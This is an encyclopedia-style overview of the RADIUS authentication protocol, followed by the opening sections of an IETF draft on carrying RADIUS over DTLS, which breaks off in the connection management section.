Remote Authentication Dial In User Service (RADIUS) is a networking protocol that provides centralized Authentication, Authorization, and Accounting (AAA) management for computers to connect and use a network service. RADIUS was developed by Livingston Enterprises, Inc., in 1991 as an access server authentication and accounting protocol and later brought into the Internet Engineering Task Force (IETF) standards.[1]

Because of the broad support and the ubiquitous nature of the RADIUS protocol, it is often used by ISPs and enterprises to manage access to the Internet or internal networks, wireless networks, and integrated e-mail services. These networks may incorporate modems, DSL, access points, VPNs, network ports, web servers, etc.[2]

RADIUS is a client/server protocol that runs in the application layer, using UDP as transport. The Remote Access Server, the Virtual Private Network server, the Network switch with port-based authentication, and the Network Access Server (NAS), are all gateways that control access to the network, and all have a RADIUS client component that communicates with the RADIUS server. The RADIUS server is usually a background process running on a UNIX or Microsoft Windows server.[3] RADIUS serves three functions:

    to authenticate users or devices before granting them access to a network,
    to authorize those users or devices for certain network services and
    to account for usage of those services.

Contents

|    1 AAA
|        1.1 Authentication and authorization
|        1.2 Accounting
|    2 Roaming
|        2.1 Realms
|        2.2 Proxy operations
|        2.3 Security
|    3 Packet structure
|        3.1 Attribute value pairs
|    4 Vendor-specific attributes
|    5 UDP port numbers
|    6 Security
|    7 RADIUS history
|    8 RFCs
|    9 See also
|    10 Bibliography
|    11 References
|    12 External links

AAA

RADIUS servers use the AAA concept to manage network access in the following two-step process, also known as an "AAA transaction". AAA stands for “authentication, authorization and accounting”. Authentication and Authorization characteristics in RADIUS are described in RFC 2865 while Accounting is described by RFC 2866.
Authentication and authorization

The user or machine sends a request to a Remote Access Server (RAS) to gain access to a particular network resource using access credentials. The credentials are passed to the RAS device via the link-layer protocol - for example, Point-to-Point Protocol (PPP) in the case of many dialup or DSL providers or posted in an HTTPS secure web form.

In turn, the RAS sends a RADIUS Access Request message to the RADIUS server, requesting authorization to grant access via the RADIUS protocol.[4]

This request includes access credentials, typically in the form of username and password or security certificate provided by the user. Additionally, the request may contain other information which the RAS knows about the user, such as its network address or phone number, and information regarding the user's physical point of attachment to the RAS.

The RADIUS server checks that the information is correct using authentication schemes such as PAP, CHAP or EAP. The user's proof of identification is verified, along with, optionally, other information related to the request, such as the user's network address or phone number, account status, and specific network service access privileges. Historically, RADIUS servers checked the user's information against a locally stored flat file database. Modern RADIUS servers can do this, or can refer to external sources — commonly SQL, Kerberos, LDAP, or Active Directory servers — to verify the user's credentials.
RADIUS Authentication and Authorization Flow

The RADIUS server then returns one of three responses to the RAS : 1) Access Reject, 2) Access Challenge, or 3) Access Accept.

    Access Reject - The user is unconditionally denied access to all requested network resources. Reasons may include failure to provide proof of identification or an unknown or inactive user account.
    Access Challenge - Requests additional information from the user such as a secondary password, PIN, token, or card. Access Challenge is also used in more complex authentication dialogs where a secure tunnel is established between the user machine and the Radius Server in a way that the access credentials are hidden from the RAS.
    Access Accept - The user is granted access. Once the user is authenticated, the RADIUS server will often check that the user is authorized to use the network service requested. A given user may be allowed to use a company's wireless network, but not its VPN service, for example. Again, this information may be stored locally on the RADIUS server, or may be looked up in an external source such as LDAP or Active Directory.

Each of these three RADIUS responses may include a Reply-Message attribute which may give a reason for the rejection, the prompt for the challenge, or a welcome message for the accept. The text in the attribute can be passed on to the user in a return web page.

Authorization attributes are conveyed to the RAS stipulating terms of access to be granted. For example, the following authorization attributes may be included in an Access-Accept:

    The specific IP address to be assigned to the user
    The address pool from which the user's IP should be chosen
    The maximum length that the user may remain connected
    An access list, priority queue or other restrictions on a user's access
    L2TP parameters
    VLAN parameters
    Quality of Service (QoS) parameters

Accounting
RADIUS Accounting Flow

Accounting is described in RFC 2866.

When network access is granted to the user by the NAS, an Accounting Start (a RADIUS Accounting Request packet containing an Acct-Status-Type attribute with the value "start") is sent by the NAS to the RADIUS server to signal the start of the user's network access. "Start" records typically contain the user's identification, network address, point of attachment and a unique session identifier.[5]

Periodically, Interim Update records (a RADIUS Accounting Request packet containing an Acct-Status-Type attribute with the value "interim-update") may be sent by the NAS to the RADIUS server, to update it on the status of an active session. "Interim" records typically convey the current session duration and information on current data usage.

Finally, when the user's network access is closed, the NAS issues a final Accounting Stop record (a RADIUS Accounting Request packet containing an Acct-Status-Type attribute with the value "stop") to the RADIUS server, providing information on the final usage in terms of time, packets transferred, data transferred, reason for disconnect and other information related to the user's network access.

Typically, the client sends Accounting-Request packets until it receives an Accounting-Response acknowledgement, using some retry interval.

The primary purpose of this data is that the user can be billed accordingly; the data is also commonly used for statistical purposes and for general network monitoring.
Roaming
Roaming using a proxy RADIUS AAA server.

RADIUS is commonly used to facilitate roaming between ISPs, for example:

    by companies which provide a single global set of credentials that are usable on many public networks;
    by independent, but collaborating, institutions issuing their own credentials to their own users, that allow a visitor from one to another to be authenticated by their home institution, such as in Eduroam.

RADIUS facilitates this by the use of realms, which identify where the RADIUS server should forward the AAA requests for processing.
Realms

A realm is commonly appended to a user's user name and delimited with an '@' sign, resembling an email address domain name. This is known as postfix notation for the realm. Another common usage is prefix notation, which involves prepending the realm to the username and using '\' as a delimiter. Modern RADIUS servers allow any character to be used as a realm delimiter, although in practice '@' and '\' are usually used.

Realms can also be compounded using both prefix and postfix notation, to allow for complicated roaming scenarios; for example, somedomain.com\username@anotherdomain.com could be a valid username with two realms.

Although realms often resemble domains, it is important to note that realms are in fact arbitrary text and need not contain real domain names.
Proxy operations

When a RADIUS server receives an AAA request for a user name containing a realm, the server will reference a table of configured realms. If the realm is known, the server will then proxy the request to the configured home server for that domain. The behaviour of the proxying server regarding the removal of the realm from the request ("stripping") is configuration-dependent on most servers. In addition, the proxying server can be configured to add, remove or rewrite AAA requests when they are proxied.
Security

Roaming with RADIUS exposes the users to various security and privacy concerns. More generally, some roaming partners establish a secure tunnel between the RADIUS servers to ensure that users' credentials cannot be intercepted while being proxied across the internet. This is a concern as the MD5 hash built into RADIUS is considered insecure.[6]
Packet structure
RADIUS packet data format.

The RADIUS packet data format is shown to the right. The fields are transmitted from left to right, starting with the code, the identifier, the length, the authenticator and the attributes.

RADIUS Codes (decimal) are assigned as follows:
Code 	Assignment
1 	Access-Request
2 	Access-Accept
3 	Access-Reject
4 	Accounting-Request
5 	Accounting-Response
11 	Access-Challenge
12 	Status-Server (experimental)
13 	Status-Client (experimental)
255 	Reserved

The Identifier field aids in matching requests and replies.

The Length field indicates the length of the entire RADIUS packet including the Code, Identifier, Length, Authenticator and optional Attribute fields.

The Authenticator is used to authenticate the reply from the RADIUS server, and is used in encrypting passwords; its length is 16 bytes.
Attribute value pairs
RADIUS AVP layout.

The RADIUS Attribute Value Pairs (AVP) carry data in both the request and the response for the authentication, authorization, and accounting transactions. The length of the radius packet is used to determine the end of the AVPs.
AVP Type 	Assignment
1 	User-Name
2 	User-Password
3 	CHAP-Password
4 	NAS-IP-Address
5 	NAS-Port
6 	Service-Type
7 	Framed-Protocol
8 	Framed-IP-Address
9 	Framed-IP-Netmask
10 	Framed-Routing
11 	Filter-Id
12 	Framed-MTU
13 	Framed-Compression
14 	Login-IP-Host
15 	Login-Service
16 	Login-TCP-Port
17 	(unassigned)
18 	Reply-Message
19 	Callback-Number
20 	Callback-Id
21 	(unassigned)
22 	Framed-Route
23 	Framed-IPX-Network
24 	State
25 	Class
26 	Vendor-Specific
27 	Session-Timeout
28 	Idle-Timeout
29 	Termination-Action
30 	Called-Station-Id
31 	Calling-Station-Id
32 	NAS-Identifier
33 	Proxy-State
34 	Login-LAT-Service
35 	Login-LAT-Node
36 	Login-LAT-Group
37 	Framed-AppleTalk-Link
38 	Framed-AppleTalk-Network
39 	Framed-AppleTalk-Zone
40 	Acct-Status-Type
41 	Acct-Delay-Time
42 	Acct-Input-Octets
43 	Acct-Output-Octets
44 	Acct-Session-Id
45 	Acct-Authentic
46 	Acct-Session-Time
47 	Acct-Input-Packets
48 	Acct-Output-Packets
49 	Acct-Terminate-Cause
50 	Acct-Multi-Session-Id
51 	Acct-Link-Count
52-59 	(reserved for accounting)
60 	CHAP-Challenge
61 	NAS-Port-Type
62 	Port-Limit
63 	Login-LAT-Port
Vendor-specific attributes

RADIUS is extensible; many vendors of RADIUS hardware and software implement their own variants using Vendor-Specific Attributes (VSAs). Microsoft has published some of their VSAs.[7] VSA definitions from many other companies remain proprietary and/or ad-hoc.
UDP port numbers

RADIUS has been officially assigned UDP ports 1812 for RADIUS Authentication and 1813 for RADIUS Accounting by the Internet Assigned Numbers Authority (IANA). However, prior to IANA allocation of ports 1812 and 1813, ports 1645 and 1646 (authentication and accounting, respectively) were used unofficially and became the default ports assigned by many RADIUS Client/Server implementations of the time. The tradition of using 1645 and 1646 for backwards compatibility continues to this day. For this reason many RADIUS Server implementations monitor both sets of UDP ports for RADIUS requests. Microsoft RADIUS servers default to 1812 and 1813. Cisco RADIUS servers listen on RADIUS ports UDP 1645 and UDP 1812 for authentication; on ports 1646 and 1813 for accounting and can be configured with non-standard ports. Juniper Networks' RADIUS servers listen on both unofficial and official ports 1645, 1812, 1646 and 1813 by default but can be configured with arbitrary ports.SBR. Cloudessa and Avaya virtual RADIUS solutions assign a pair of unique authentication and accounting ports to each virtual RADIUS server.
Security

The RADIUS protocol does not transmit passwords in cleartext between the NAS and RADIUS server (not even with PAP protocol). Rather, a shared secret is used along with the MD5 hashing algorithm to obfuscate passwords. Because this particular implementation is not considered to be a very strong protection of the user's credentials,[8] additional protection, such as IPsec tunnels or physically secured data-center networks, should be used to further protect the RADIUS traffic between the NAS device and the RADIUS server. Additionally, the user's security credentials are the only part protected by RADIUS itself, yet other user-specific attributes such as tunnel-group IDs or vlan memberships passed over RADIUS may be considered sensitive (helpful to an attacker) or private (sufficient to identify the individual client) information as well.[citation needed] The RadSec protocol claims to solve aforementioned security issues.
RADIUS history

RADIUS was originally specified in an RFI by Merit Network in 1991 to control dial-in access to NSFnet. Livingston Enterprises responded to the RFI with a description of a RADIUS server. Merit Network awarded the contract to Livingston Enterprises that delivered their PortMaster series of Network Access Servers and the initial RADIUS server to Merit. RADIUS was later (1997) published as RFC 2058 and RFC 2059 (current versions are RFC 2865 and RFC 2866).[1]

Now, several commercial and open-source RADIUS servers exist. Features can vary, but most can look up the users in text files, LDAP servers, various databases, etc. Accounting records can be written to text files, various databases, forwarded to external servers, etc. SNMP is often used for remote monitoring and keep-alive checking of a RADIUS server. RADIUS proxy servers are used for centralized administration and can rewrite RADIUS packets on the fly (for security reasons, or to convert between vendor dialects).

The Diameter protocol is the planned replacement for RADIUS. Diameter uses SCTP or TCP while RADIUS uses UDP as the transport layer.
RFCs

The RADIUS protocol is currently defined in the following IETF RFCs: Obsolete RFCs are indicated with strikethrough text.
# 	Title 	Date published 	Related article 	Obsoleted by 	Notes
RFC 2058 	Remote Authentication Dial In User Service (RADIUS) 	January 1997 	RADIUS 	RFC 2138 	
RFC 2059 	RADIUS Accounting 	January 1997 	RADIUS 	RFC 2139 	
RFC 2138 	Remote Authentication Dial In User Service (RADIUS) 	April 1997 	RADIUS 	RFC 2865 	
RFC 2139 	RADIUS Accounting 	April 1997 	RADIUS 	RFC 2866 	
RFC 2548 	Microsoft Vendor-specific RADIUS Attributes 	March 1999 	RADIUS 		
RFC 2607 	Proxy Chaining and Policy Implementation in Roaming 	June 1999 			
RFC 2618 	RADIUS Authentication Client MIB 		Management information base 	RFC 4668 	
RFC 2619 	RADIUS Authentication Server MIB 		Management information base 	RFC 4669 	
RFC 2620 	RADIUS Accounting Client MIB 	June 1999 	Management information base 	RFC 4670 	
RFC 2621 	RADIUS Accounting Server MIB 	June 1999 	Management information base 	RFC 4671 	
RFC 2809 	Implementation of L2TP Compulsory Tunneling via RADIUS 	April 2000 			
RFC 2865 	Remote Authentication Dial In User Service (RADIUS) 	June 2000 	RADIUS 		Updated by: RFC 2868, RFC 3575, RFC 5080
RFC 2866 	RADIUS Accounting 	June 2000 	RADIUS 		
RFC 2867 	RADIUS Accounting Modifications for Tunnel Protocol Support 	June 2000 	RADIUS 		Updates RFC 2866
RFC 2868 	RADIUS Attributes for Tunnel Protocol Support 	June 2000 			Updates RFC 2865
RFC 2869 	RADIUS Extensions 	June 2000 			updated by RFC 3579, RFC 5080
RFC 2882 	Network Access Servers Requirements: Extended RADIUS Practices 	July 2000 			
RFC 3162 	RADIUS and IPv6 	August 2001 			
RFC 3575 	IANA Considerations for RADIUS 	July 2003 			
RFC 3576 	Dynamic Authorization Extensions to RADIUS 	July 2003 		RFC 5176 	
RFC 3579 	RADIUS Support for EAP 	September 2003 	Extensible Authentication Protocol 		Updates: RFC 2869
RFC 3580 	IEEE 802.1X RADIUS Usage Guidelines 	September 2003 	802.1X 		
RFC 4014 	RADIUS Attributes Suboption for the DHCP Relay Agent Information Option 	February 2005 			
RFC 4372 	Chargeable User Identity 	January 2006 			
RFC 4590 	RADIUS Extension for Digest Authentication 	July 2006 		RFC 5090 	
RFC 4668 	RADIUS Authentication Client MIB for IPv6 	August 2006 	Management information base 		
RFC 4669 	RADIUS Authentication Server MIB for IPv6 	August 2006 	Management information base 		
RFC 4670 	RADIUS Accounting Client MIB for IPv6 	August 2006 	Management information base 		
RFC 4671 	RADIUS Accounting Server MIB for IPv6 	August 2006 	Management information base 		
RFC 4675 	RADIUS Attributes for Virtual LAN and Priority Support 	September 2006 			
RFC 4679 	DSL Forum Vendor-Specific RADIUS Attributes 	September 2006 			
RFC 4818 	RADIUS Delegated-IPv6-Prefix Attribute 	April 2007 			
RFC 4849 	RADIUS Filter Rule Attribute 	April 2007 			
RFC 5080 	Common RADIUS Implementation Issues and Suggested Fixes 	December 2007 			Updates RFC 3579
RFC 5090 	RADIUS Extension for Digest Authentication 	February 2008 			
RFC 5176 	Dynamic Authorization Extensions to RADIUS 	January 2008 			
RFC 5607 	RADIUS Authorization for NAS Management 	July 2009 			
RFC 5997 	Use of Status-Server Packets in the RADIUS Protocol 	August 2010 			Updates RFC 2866

	8.3 Securing RADIUS

		8.3.1 RADIUS/DTLS 

			8.3.1.1 http://tools.ietf.org/html/draft-dekok-radext-dtls-03 

[Docs] [txt|pdf] [Tracker] [Email] [Diff1] [Diff2] [Nits]

Versions: 00 01 02 03

Network Working Group                                         Alan DeKok
INTERNET-DRAFT                                                FreeRADIUS
Category: Informational
<draft-dekok-radext-dtls-03.txt>
Expires: February 25, 2010
26 July 2010



                  
DTLS as a Transport Layer for RADIUS

                       
draft-dekok-radext-dtls-03



Abstract

   The RADIUS protocol [RFC2865] has limited support for authentication
   and encryption of RADIUS packets.  The protocol transports data "in
   the clear", although some parts of the packets can have "hidden"
   content.  Packets may be replayed verbatim by an attacker, and
   client-server authentication is based on fixed shared secrets.  This
   document specifies how the Datagram Transport Layer Security (DTLS)
   protocol may be used as a fix for these problems.  It also describes
   how implementations of this proposal can co-exist with current RADIUS
   systems.

Status of this Memo

   This Internet-Draft is submitted to IETF in full conformance with the
   provisions of BCP 78 and BCP 79.

   Internet-Drafts are working documents of the Internet Engineering
   Task Force (IETF), its areas, and its working groups.  Note that
   other groups may also distribute working documents as Internet-
   Drafts.

   Internet-Drafts are draft documents valid for a maximum of six months
   and may be updated, replaced, or obsoleted by other documents at any
   time.  It is inappropriate to use Internet-Drafts as reference
   material or to cite them other than as "work in progress."

   The list of current Internet-Drafts can be accessed at
   http://www.ietf.org/ietf/1id-abstracts.txt.

   The list of Internet-Draft Shadow Directories can be accessed at
   http://www.ietf.org/shadow.html.

   This Internet-Draft will expire on February 25, 2010

Copyright Notice



DeKok, Alan                   Informational                     [Page 1]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


   Copyright (c) 2010 IETF Trust and the persons identified as the
   document authors.  All rights reserved.

   This document is subject to BCP 78 and the IETF Trust's Legal
   Provisions Relating to IETF Documents
   (http://trustee.ietf.org/license-info/) in effect on the date of
   publication of this document.  Please review these documents
   carefully, as they describe your rights and restrictions with respect
   to this document.  Code Components extracted from this document must
   include Simplified BSD License text as described in Section 4.e of
   the Trust Legal Provisions and are provided without warranty as
   described in the Simplified BSD License.

   This document may contain material from IETF Documents or IETF
   Contributions published or made publicly available before November
   10, 2008.  The person(s) controlling the copyright in some of this
   material may not have granted the IETF Trust the right to allow
   modifications of such material outside the IETF Standards Process.
   Without obtaining an adequate license from the person(s) controlling
   the copyright in such materials, this document may not be modified
   outside the IETF Standards Process, and derivative works of it may
   not be created outside the IETF Standards Process, except to format
   it for publication as an RFC or to translate it into languages other
   than English.



























DeKok, Alan                   Informational                     [Page 2]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


Table of Contents

|| 1.  Introduction .............................................    4
|   1.1.  Terminology .........................................    4
|   1.2.  Requirements Language ...............................    5
|| 2.  Building on Existing Foundations .........................    6
|   2.1.  Changes to RADIUS ...................................    6
|   2.2.  Changes from RADIUS over TLS (RADIUS/TLS) ...........    6
|      2.2.1.  Changes from RADIUS/TLS to RADIUS/DTLS .........    7
|      2.2.2.  Reinforcement of RADIUS/TLS ....................    8
|| 3.  Reception of Packets .....................................    8
|   3.1.  Protocol Disambiguation .............................    9
|| 4.  Connection Management ....................................   10
|   4.1.  Server Connection Management ........................   10
|      4.1.1.  Table Management ...............................   10
|   4.2.  Client Connection Management ........................   11
|| 5.  Processing Algorithm .....................................   12
|| 6.  Diameter Considerations ..................................   14
|| 7.  IANA Considerations ......................................   14
|| 8.  Security Considerations ..................................   14
|   8.1.  Legacy RADIUS Security ..............................   14
|| 9.  References ...............................................   15
|   9.1.  Normative references ................................   15
|   9.2.  Informative references ..............................   16



























DeKok, Alan                   Informational                     [Page 3]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


| 1. Introduction


   The RADIUS protocol as described in [RFC2865], [RFC2866], and
   [RFC5176] has traditionally used methods based on MD5 [RFC1321] for
   per-packet authentication and integrity checks.  However, the MD5
   algorithm has known weaknesses such as [MD5Attack] and [MD5Break].
   As a result, previous specifications such as [RFC5176] have
   recommended using IPSec to secure RADIUS traffic.

   While RADIUS over IPSec has been widely deployed, there are
   difficulties with this approach.  The simplest point against IPSec is
   that there is no straightforward way for a RADIUS application to
   control or monitor the network security policies.  That is, the
   requirement that the RADIUS traffic be encrypted and/or authenticated
   is implicit in the network configuration, and is not enforced by the
   RADIUS application.

   This specification takes a different approach.  We define a method
   for using DTLS [RFC4347] as a RADIUS transport protocol.  This
   approach has the benefit that the RADIUS application can directly
   monitor and control the security policies associated with the traffic
   that it processes.

   Another benefit is that RADIUS over DTLS continues to be a UDP-based
   protocol.  This continuity ensures that existing network-layer
   infrastructure (firewall rules, etc.) does not need to be changed
   when RADIUS clients and servers are upgraded to support RADIUS over
   DTLS.

   This specification does not, however, solve all of the problems
   associated with RADIUS.  The DTLS protocol does not add reliable or
   in-order transport to RADIUS.  DTLS also does not support
   fragmentation of application-layer messages, or of the DTLS messages
   themselves.  This specification therefore continues to have all of
   the issues that RADIUS currently has with order, reliability, and
   fragmentation.

| 1.1. Terminology


   This document uses the following terms:

RADIUS/DTLS
     This term is a short-hand for "RADIUS over DTLS".

RADIUS/DTLS client
     This term refers both to RADIUS clients as defined in [RFC2865],
     and to Dynamic Authorization clients as defined in [RFC5176], that
     implement RADIUS/DTLS.



DeKok, Alan                   Informational                     [Page 4]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


RADIUS/DTLS server
     This term refers both to RADIUS servers as defined in [RFC2865],
     and to Dynamic Authorization servers as defined in [RFC5176], that
     implement RADIUS/DTLS.

silently discard
     This means that the implementation discards the packet without
     further processing.  The implementation MAY provide the capability
     of logging the error, including the contents of the silently
     discarded packet, and SHOULD record the event in a statistics
     counter.

| 1.2. Requirements Language


   In this document, several words are used to signify the requirements
   of the specification.  The key words "MUST", "MUST NOT", "REQUIRED",
   "SHALL", "SHALL NOT", "SHOULD", "SHOULD NOT", "RECOMMENDED",  "MAY",
   and "OPTIONAL" in this document are to be interpreted as described in
   [RFC2119].
































DeKok, Alan                   Informational                     [Page 5]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


| 2. Building on Existing Foundations


   Adding DTLS as a RADIUS transport protocol requires a number of
   changes to systems implementing standard RADIUS. This section
   outlines those changes, and defines new behaviors necessary to
   implement DTLS.

| 2.1. Changes to RADIUS


   The RADIUS packet format is unchanged from [RFC2865], [RFC2866], and
   [RFC5176].  Specifically, all of the following portions of RADIUS
   MUST be unchanged when using RADIUS over DTLS:

      * Packet format
      * Permitted codes
      * Request Authenticator calculation
      * Response Authenticator calculation
      * Minimum packet length
      * Maximum packet length
      * Attribute format
      * Vendor-Specific Attribute (VSA) format
      * Permitted data types
      * Calculations of dynamic attributes such as CHAP-Challenge,
        or Message-Authenticator.
      * Calculation of "encrypted" attributes such as Tunnel-Password.
      * UDP port numbering and usage

   The RADIUS packets are encapsulated in DTLS, which acts as a
   transport layer for it. The requirements above ensure the simplest
   possible implementation and widest interoperability of this
   specification.

   The only changes made to RADIUS in this specification are the
   following two items:

      (1) The Length checks defined in [RFC2865] Section 3 MUST use the
      length of the decrypted DTLS data instead of the UDP packet
      length.

      (2) The shared secret secret used to compute the MD5 integrity
      checks and the attribute encryption MUST be "radsec".

   All other portions of RADIUS are unchanged.

| 2.2. Changes from RADIUS over TLS (RADIUS/TLS)


   While this specification is largely RADIUS/TLS over UDP instead of
   TCP, there are some differences between the two methods.



DeKok, Alan                   Informational                     [Page 6]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


   This section goes through the [RADIUS/TLS] document in detail,
   explaining the differences between RADIUS/TLS and RADIUS/DTLS.  As
   most of [RADIUS/TLS] also applies to RADIUS/DTLS, we highlight only
   the changes here, explaining how to interpret [RADIUS/TLS] for this
   specification:

      * We replace references to "TCP" with "UDP"

      * We replace references to "RADIUS/TLS" with "RADIUS/DTLS"

      * We replace references to "TLS" with "DTLS"

   Those changes are sufficient to cover the majority of the differences
   between the two specifications.  The text below goes through some of
   the sections of [RADIUS/TLS], giving additional commentary only where
   necessary.

| 2.2.1. Changes from RADIUS/TLS to RADIUS/DTLS


   Section 2.1 does not apply to RADIUS/DTLS.  The relationship between
   RADIUS packet codes and UDP ports in RADIUS/DTLS is unchanged from
   RADIUS.

   Section 2.2 applies also to RADIUS/DTLS, except for the
   recommendation that implementations "SHOULD" support
   TLS_RSA_WITH_RC4_128_SHA, which does not apply to RADIUS/DTLS.

   Section 2.3 applies also to RADIUS/TLS.

   Section 2.4 does not apply to RADIUS/DTLS.  See the comments above on
   Section 2.1.  The relationship between RADIUS packet codes and UDP
   ports in RADIUS/DTLS is unchanged from RADIUS.

   Section 3.3 item (1) does not apply to RADIUS/DTLS.  Each RADIUS
   packet is encapsulated in one DTLS packet, and there is no "stream"
   of RADIUS packets inside of a TLS session.  Implementors MUST enforce
   the requirements of [RFC2865] Section 3 for the RADIUS Length field,
   using the length of the decrypted DTLS data for the checks.  This
   check replaces the RADIUS method of using the length field from the
   UDP packet.

   Section 3.3 item (3) does not apply to RTDLS.  The relationship
   between RADIUS packet codes and UDP ports in RADIUS/DTLS is unchanged
   from RADIUS.

   Section 3.3 item (4) does not apply to RADIUS/DTLS.  As RADIUS/DTLS
   still uses UDP for a transport, the use of negative ICMP responses is
   unchanged from RADIUS.



DeKok, Alan                   Informational                     [Page 7]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


| 2.2.2. Reinforcement of RADIUS/TLS


   We wish to re-iterate that much of [RADIUS/TLS] applies to this
   document.  Specifically, Section 4 and Section 6 of that document are
   applicable in whole to RADIUS/DTLS.

| 3. Reception of Packets


   As this specification permits implementations to to accept both
   traditional RADIUS and DTLS packets on the same port, we define a
   method to disambiguate between packets for the two protocols.  This
   method is applicable only to RADIUS servers.  RADIUS/DTLS clients
   SHOULD use connected sockets, as discussed in Section X.Y, below.

   RADIUS/DTLS servers MUST maintain a boolean flag for each RADIUS
   client that indicates whether or not it supports RADIUS/DTLS.  The
   interpretation of this flag is as follows. If the flag is "false",
   then the client may support RADIUS/DTLS.  Packets from the client
   need to be examined to see if they are RADIUS or RADIUS/DTLS.  If the
   flag is "true" then the client supports RADIUS/DTLS, and all packets
   from that client MUST be processed as RADIUS/DTLS.

   Note that this last requirement can impose significant changes for
   RADIUS clients.  Clients can no longer have multiple independent
   RADIUS implementations or processes that originate packets.  We
   RECOMMEND that RADIUS/DTLS clients implement a local RADIUS proxy
   that arbitrates all RADIUS traffic.

   This flag MUST be exposed to administrators of the RADIUS server.  As
   RADIUS clients are upgraded, administrators can then manually mark
   them as supporting RADIUS/DTLS.

   We recognize, however, the upgrade path from RADIUS to RADIUS/DTLS is
   important.  This path requires an RADIUS/DTLS server to accept
   packets from a RADIUS client without knowing beforehand if they are
   RADIUS or DTLS.  The method to distinguish between the two is defined
   in the next section.

   Once an RADIUS/DTLS server has established a DTLS session with a
   client that had the flag set to "false", it MUST set the flag to
   "true".  This change forces all subsequent traffic from that client
   to use DTLS, and prevents bidding-down attacks.  The server SHOULD
   also notify the administrator that it has successfully established
   the first DTLS session with that client.







DeKok, Alan                   Informational                     [Page 8]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


| 3.1. Protocol Disambiguation


   When a RADIUS client is not marked as supporting RADIUS/DTLS, packets
   from that client may be, or may not be DTLS.  In order to provide a
   robust upgrade path, the RADIUS/DTLS server MUST examine the packet
   to see if it is RADIUS or DTLS.  In order to justify the examination
   methods, we first examine the packet formats for the two protocols.

   The DTLS record format ([RFC4347] Section 4.1) is shown below, in
   pseudo-code:

         struct {
                 uint8 type;
                 uint16 version;
                 uint16 epoch;
                 uint48 sequence_number;
                 uint16 length;
                 uint8 fragment[DTLSPlaintext.length];
         } DTLSPlaintext;

   The RADIUS record format ([RFC2865] Section 3) is shown below, in
   pseudo-code, with AuthVector.length=16.

         struct {
                 uint8 code;
                 uint8 id;
                 uint16 length;
                 uint8 vector[AuthVector.length];
                 uint8 data[RadiusPacket.length - 20];
         } RadiusPacket;

   We can see here that a number of fields overlap between the two
   protocols.  The low byte of the DTLS version and the high byte of the
   DTLS epoch overlap with the RADIUS length field.  The DTLS length
   field overlaps with the RADIUS authentication vector.  At first
   glance, it may be difficult for an application to accept both
   protocols on the same port.  However, this is not the case.

   For the initial packet of a DTLS connection, the type field has value
   22 (handshake), and the epoch and sequence number fields are
   initialized to zero.  The RADIUS code value of 22 has been assigned
   as Resource-Free-Response, but it is not in wide use.  In addition,
   that packet code is a response packet, and would not be sent by a
   RADIUS client to a server.

   As a result, protocol disambiguation is straightforward.  If the
   first byte of the packet has value 22, it is a DTLS packet, and is a
   DTLS connection initiation request.  Otherwise, it is a RADIUS



DeKok, Alan                   Informational                     [Page 9]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


   packet.

   Once a DTLS session has been established, a separate tracking table
   is used to disambiguate the protocols.  The definition of this
   tracking table is given in the next section.

   The full processing algorithm is given below, in Section X.Y.

| 4. Connection Management


   Where [RADIUS/TLS] can rely on the TCP state machine to perform
   connection tracking, this specification cannot.  As a result,
   implementations of this specification will need to perform connection
   management of the DTLS session in the application layer.

| 4.1. Server Connection Management


   An RADIUS/DTLS server MUST maintain a table that tracks ongoing DTLS
   sessions based on a key composed of the following 4-tuple:

      * source IP address
      * source port
      * destination IP address
      * destination port

   The contents of the tracking table are a implementation-specific
   value that describes an active DTLS session.  This connection
   tracking allows DTLS packets that have been received to be associated
   with an active DTLS session.

   RADIUS/DTLS servers SHOULD NOT use a "connect" API to manage DTLS
   connections, as a connected UDP socket will accept packets only from
   one source IP address and port.  This limitation would prevent the
   server from engaging in the normal RADIUS practice of accepting
   packets from multiple clients on the same port.

   Note that [RFC5080] Section 2.2.2 defines a duplicate detection cache
   which tracks packets by key similar to that defined above.

| 4.1.1. Table Management


   This tracking table is subject to Denial of Service (DoS) attacks.
   RADIUS/DTLS servers SHOULD use the stateless cookie tracking
   technique described in [RFC4347] Section 4.2.1.  DTLS sessions SHOULD
   NOT be added to the tracking table until a ClientHello packet has
   been received with an appropriate Cookie value.

   Entries in the tracking table MUST deleted when a TLS Closure Alert



DeKok, Alan                   Informational                    [Page 10]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


   ([RFC5246] Section 7.2.1) or a TLS Error Alert ([RFC5246] Section
   7.2.2) is received.  Where the RADIUS specifications require that a
   RADIUS packet received via the DTLS session is to be "silently
   discarded", the entry in the tracking table corresponding to that
   DTLS session MUST also be deleted, the DTLS session MUST be closed,
   and any TLS session resumption parameters for that session MUST be
   discarded.

   As UDP does not offer guaranteed delivery of messages, RADIUS/DTLS
   servers MUST also maintain a timestamp per DTLS session.  The
   timestamp SHOULD be updated on reception of a valid DTLS packet.  The
   timestamp MUST NOT be updated in other situations.  When a session
   has not been used for a period of time, the server SHOULD pro-
   actively close it, and delete the DTLS session from the tracking
   table.  The server MAY cache the TLS session parameters, in order to
   provide for fast session resumption.

   This session lifetime SHOULD be exposed as configurable setting.  It
   SHOULD NOT be set to less than 60 seconds, and SHOULD NOT be set to
   more than 600 seconds (10 minutes).  The minimum value useful value
   for this timer is determined by the application-layer watchdog
   mechanism defined in the following section.

   RADIUS/DTLS servers SHOULD also keep track of the total number of
   sessions in the tracking table, and refuse to create new sessions
   when a large number are already being tracked.  As system
   capabilities vary widely, we can only recommend that this number
   SHOULD be exposed as a configurable setting.

| 4.2. Client Connection Management


   RADIUS/DTLS clients SHOULD use an operating system API to "connect" a
   UDP socket.  This "connected" socket will then rely on the operating
   system to perform connection tracking, and will be simpler than the
   method described above for servers.  RADIUS/DTLS clients SHOULD NOT
   use "unconnected" sockets, as it causes increased complexity in the
   client application.

   Once a DTLS session is established, an RADIUS/DTLS client SHOULD use
   the application-layer watchdog algorithm defined in [RFC3539] to
   determine server responsiveness.  The Status-Server packet defined in
